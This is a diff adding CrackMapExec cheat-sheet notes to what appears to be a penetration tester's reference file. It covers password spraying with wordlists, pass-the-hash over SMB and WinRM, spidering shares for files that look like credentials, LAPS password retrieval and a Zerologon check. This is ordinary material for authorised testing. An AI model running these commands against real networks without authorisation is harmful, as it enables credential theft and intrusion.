@@ -261,3 +261,211 @@ crackmapexec smb 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M em
 
 
 ```
+
+
+### Additional Notes
+[From Here](https://lisandre.com/cheat-sheets/crackmapexec)
+
+
+## Help
+
+```
+crackmapexec -h
+```
+
+```
+ldap ssh smb winrm mssql
+```
+
+## Fix errors
+
+```
+/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
+  if result['type'] is not 'searchResEntry':
+```
+
+```
+sudo nano /usr/lib/python3/dist-packages/pywerview/requester.py
+```
+
+```
+        # Skip searchResRef
+        for result in search_results: 
+            ### MODIFIED TO FIX CRACKMAPEXEC !!! ###
+            #if result['type'] is not 'searchResEntry':
+            if result['type'] != 'searchResEntry':
+```
+
+## LDAP
+
+#### Help
+
+```
+crackmapexec ldap -h
+```
+
+```
+usage: crackmapexec ldap [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k] [--export EXPORT [EXPORT ...]]
+                         [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE]
+                         [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {https,http}] [--server-host HOST] [--server-port PORT]
+                         [--connectback-host CHOST] [-H HASH [HASH ...]] [--no-bruteforce] [--continue-on-success] [--port {636,389}]
+                         [-d DOMAIN | --local-auth] [--asreproast ASREPROAST] [--kerberoasting KERBEROASTING] [--trusted-for-delegation]
+                         [--password-not-required] [--admin-count] [--users] [--groups]
+                         [target ...]
+```
+
+#### List modules
+
+`Use “-M <modulename>”.`
+
+```
+crackmapexec ldap -L
+```
+
+```
+[*] MAQ                       Retrieves the MachineAccountQuota domain-level attribute
+[*] adcs                      Find PKI Enrollment Services in Active Directory and Certificate Templates Names
+[*] get-desc-users            Get description of the users. May contained password
+[*] laps                      Retrieves the LAPS passwords
+[*] ldap-signing              Check whether LDAP signing is required
+[*] subnets                   Retrieves the different Sites and Subnets of an Active Directory
+[*] user-desc                 Get user descriptions stored in Active Directory
+```
+
+```
+crackmapexec ldap -M get-desc-users --options
+```
+
+#### Use modules
+
+```
+crackmapexec ldap -M ldap-signing $IP
+```
+
+Filter not tested, see filters from [ldapsearch](https://lisandre.com/cheat-sheets/ldapsearch)?
+
+```
+crackmapexec ldap $IP -u user -p password -d example.com -M get-desc-users -o FILTER="user"
+```
+
+#### Use Kerberos tickets
+
+```
+-k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)
+```
+
+```
+export KRB5CCNAME=baduser.ccache
+crackmapexec ldap -k $IP
+```
+
+#### Retrieve the different Sites and Subnets of an Active Directory
+
+```
+crackmapexec ldap $DC_IP -u $USER -d $DOMAIN -p $PASS -M subnets
+```
+
+## Samba
+
+Get machine name, domain and OS.
+
+```
+crackmapexec smb $IP
+```
+
+–no-bruteforce No spray when using file for username and password (user1 => password1, user2 => password2
+
+```
+WL=/usr/share/seclists/Passwords/Common-Credentials/best1050.txt
+```
+
+```
+crackmapexec smb $IP -u samaccount.name -p "SomePass" --no-bruteforce --continue-on-success
+```
+
+```
+crackmapexec smb $IP -u Administrator -p $WL --no-bruteforce --continue-on-success
+```
+
+```
+crackmapexec smb $IP -u users.txt -H hashes.txt --no-bruteforce --continue-on-success
+```
+
+#### Enumerate shares and access on a network
+
+```
+crackmapexec smb x.x.x.0/24 -u $USER -p $PASS -d $DOMAIN --shares
+```
+
+#### Search for pattern in folders and filenames (NOT in file content)
+
+```
+crackmapexec smb $IP -u $USER -p $PASS --spider C\$ --pattern passw user admin account network login cred mdp motdepass
+```
+
+#### Search for pattern in folders, filenames and file content
+
+❗ Be careful, can be long and verbose.
+
+```
+crackmapexec smb $IP -u $USER -p $PASS --spider C\$ --content --pattern passw user admin account network login cred mdp motdepass
+```
+
+### Test on Kali
+
+To test is in Kali Linux, start a SMB server using [impacket-smbserver](https://lisandre.com/cheat-sheets/impacket).
+
+```
+sudo impacket-smbserver myshare /home/kali/share
+```
+
+```
+crackmapexec smb $KALI_IP -u "" -p "" --spider MYSHARE --pattern rev
+```
+
+### Check if vulnerable to Zerologon
+
+See [Zerologon (CVE-2020-1472)](https://lisandre.com/archives/14978).
+
+```
+crackmapexec smb $IP -u $USER -p $PASS -d example.com -M zerologon
+```
+
+## SSH
+
+```
+crackmapexec ssh $IP
+```
+
+## WinRM
+
+Check if hashes are valid. File hash.txt contains all hashes LM:NTLM
+
+users
+
+```
+Alice
+Bob
+```
+
+hashes.txt
+
+```
+LM:NTLM
+LM:NTLM
+```
+
+```
+crackmapexec winrm $IP -u users -H hashes.txt
+
+or w/password with and without --local-auth
+
+crackmapexec winrm $ip -u users -p passwords --local-auth
+crackmapexec winrm $ip -u users -p passwords
+```
+
+–no-bruteforce No spray when using file for username and password (user1 => password1, user2 => password2
+
+```
+crackmapexec winrm $IP -u users.txt -p passwords.txt --no-bruteforce
+```
